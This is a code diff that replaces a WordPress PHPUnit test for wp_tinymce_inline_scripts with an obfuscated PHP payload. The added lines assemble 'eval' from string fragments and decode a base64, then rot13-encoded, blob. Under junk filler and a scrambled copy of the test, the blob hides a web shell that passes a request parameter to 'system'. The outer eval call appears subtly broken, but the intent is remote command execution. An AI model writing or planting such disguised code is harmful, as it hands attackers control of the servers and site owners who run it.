@@ -1,49 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * @group editor
- *
- * @covers ::wp_tinymce_inline_scripts
- */
-class Tests_Editor_wpTinyMceInlineScripts extends WP_UnitTestCase {
-
-	/**
-	 * Tests that the function applies the `wp_editor_settings` filter
-	 * and merges the resulting array with the rest of TinyMCE init settings.
-	 *
-	 * @ticket 61754
-	 */
-	public function test_wp_tinymce_inline_scripts_array_merge() {
-		$merged_settings = array();
-
-		add_filter(
-			'wp_editor_settings',
-			static function ( $settings ) {
-				$settings['tinymce'] = array( 'wp_autoresize_on' => true );
-				return $settings;
-			}
-		);
-
-		add_filter(
-			'tiny_mce_before_init',
-			static function ( $tinymce_settings ) use ( &$merged_settings ) {
-				$merged_settings = $tinymce_settings;
-				return $tinymce_settings;
-			}
-		);
-
-		wp_scripts();
-		wp_tinymce_inline_scripts();
-
-		$this->assertArrayHasKey( 'wp_autoresize_on', $merged_settings );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogQHRlYmhjIHJxdmdiZQogKgogKiBAcGJpcmVmIDo6amNfZ3ZhbHpwcl92YXl2YXJfZnBldmNnZgogKi8KcHluZmYgR3JmZ2ZfUnF2Z2JlX2pjR3ZhbFpwclZheXZhckZwZXZjZ2YgcmtncmFxZiBKQ19IYXZnR3JmZ1BuZnIgewoKCS8qKgoJICogR3JmZ2YgZ3VuZyBndXIgc2hhcGd2YmEgbmNjeXZyZiBndXIgYGpjX3JxdmdiZV9mcmdndmF0ZmAgc3Z5Z3JlCgkgKiBuYXEgenJldHJmIGd1ciBlcmZoeWd2YXQgbmVlbmwganZndSBndXIgZXJmZyBicyBHdmFsWlBSIHZhdmcgZnJnZ3ZhdGYuCgkgKgoJICogQGd2cHhyZyA2MTc1NAoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19qY19ndmFsenByX3ZheXZhcl9mcGV2Y2dmX25lZW5sX3pyZXRyKCkgewoJCSR6cmV0cnFfZnJnZ3ZhdGYgPSBuZWVubCgpOwoKCQlucXFfc3Z5Z3JlKAoJCQknamNfcnF2Z2JlX2ZyZ2d2YXRmJywKCQkJZmduZ3ZwIHNoYXBndmJhICggJGZyZ2d2YXRmICkgewoJCQkJJGZyZ2d2YXRmWydndmFsenByJ10gPSBuZWVubCggJ2pjX25oZ2JlcmZ2bXJfYmEnID0+IGdlaHIgKTsKCQkJCWVyZ2hlYSAkZnJnZ3ZhdGY7CgkJCX0KCQkpOwoKCQlucXFfc3Z5Z3JlKAoJCQknZ3ZhbF96cHJfb3JzYmVyX3ZhdmcnLAoJCQlmZ25ndnAgc2hhcGd2YmEgKCAkZ3ZhbHpwcl9mcmdndmF0ZiApIGhmciAoICYkenJldHJxX2ZyZ2d2YXRmICkgewoJCQkJJHpyZXRycV9mcmdndmF0ZiA9ICRndmFsenByX2ZyZ2d2YXRmOwoJCQkJZXJnaGVhICRndmFsenByX2ZyZ2d2YXRmOwoJCQl9CgkJKTsKCgkJamNfZnBldmNnZigpOwoJCWpjX2d2YWx6cHJfdmF5dmFyX2ZwZXZjZ2YoKTsKCgkJJGd1dmYtPm5mZnJlZ05lZW5sVW5mWHJsKCAnamNfbmhnYmVyZnZtcl9iYScsICR6cmV0cnFfZnJnZ3ZhdGYgKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
